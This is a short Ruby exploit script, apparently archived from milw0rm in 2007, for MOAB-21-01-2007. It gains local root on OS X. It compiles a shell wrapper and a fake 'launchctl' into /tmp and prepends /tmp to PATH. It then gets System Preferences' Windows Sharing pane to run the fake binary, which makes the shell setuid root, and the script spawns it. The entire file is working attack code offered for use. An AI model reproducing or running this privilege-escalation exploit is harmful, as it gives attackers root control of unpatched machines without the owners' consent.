#!/usr/bin/ruby
# Copyright (c) 2007 Kevin Finisterre <kf_lists [at] digitalmunition.com>
#                    Lance M. Havok   <lmh [at] info-pull.com>
# All pwnage reserved.
#
# "Exploit" for MOAB-21-01-2007: OS X, making root shells easier each day.
#

SHELL_WRAP      = 'int main() { system("/bin/sh -i"); return 0; }'
SHELL_PLANT     = 'int main() { system("chown root: /tmp/shX; chmod 4755 /tmp/shX"); return 0; }'
PREFS_BINPATH   = '/Applications/System\ Preferences.app/Contents/MacOS/System\ Preferences'

COMMAND_LINE    = "echo '#{SHELL_WRAP}' > /tmp/t.c &&"    +
                  "cc -o /tmp/shX /tmp/t.c &&"            +
                  "echo '#{SHELL_PLANT}' > /tmp/t.c &&"   +
                  "cc -o /tmp/launchctl /tmp/t.c &&"      +
                  'export PATH="/tmp/:$PATH" &&'          +
                  "#{PREFS_BINPATH} &"

def escalate()
  system COMMAND_LINE
  puts "++ Click on Sharing and then click on Windows Sharing..."
  sleep 30 # make sure you have "time"
  system "/tmp/shX" 
end

escalate()

# milw0rm.com [2007-01-21]
